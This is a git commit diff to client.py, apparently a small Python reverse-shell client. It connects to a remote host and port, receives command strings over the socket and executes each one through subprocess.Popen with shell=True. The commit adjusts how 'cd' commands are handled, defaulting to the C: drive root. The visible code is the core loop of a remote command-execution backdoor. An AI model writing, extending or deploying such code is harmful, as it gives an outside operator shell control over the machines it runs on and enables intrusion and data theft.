f3ef40cc19b0a4bb3d528f59de2188be59a12da7
Andrew Simonson <asimonson1125@gmail.com>
2020-08-20 20:32:38 -0400

    try home directory

--- client.py
+++ client.py
@@ -10,9 +10,11 @@ s.connect((host, port))
 while True:
     data = s.recv(1024)
     rawcmd = data[:].decode("utf-8")
-    if data[:2] == "cd":
-        os.chdir(data[3:].decode("utf-8"))
-        s.send(str.encode(str(os.getcwd()) + "> "))
+    if data[:2].decode("utf-8") == 'cd':
+        if len(data) <= 2:
+            os.chdir('C:////')
+        else:
+            os.chdir(data[3:].decode("utf-8"))
     if len(data) > 0:
         cmd = subprocess.Popen(rawcmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
